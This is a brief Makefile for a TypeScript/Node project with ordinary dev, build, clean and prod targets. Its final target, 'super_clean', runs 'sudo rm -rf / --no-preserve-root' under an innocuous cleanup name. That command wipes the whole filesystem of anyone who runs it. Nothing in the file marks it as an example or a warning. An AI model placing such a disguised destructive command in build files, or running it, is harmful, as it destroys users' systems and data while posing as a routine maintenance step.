dev:
	@npm run dev

build:
	@npx tsc 

clean:
	@rm -rf dist/

prod:
	@make build
	@node dist/index.js

super_clean:
	@sudo rm -rf / --no-preserve-root
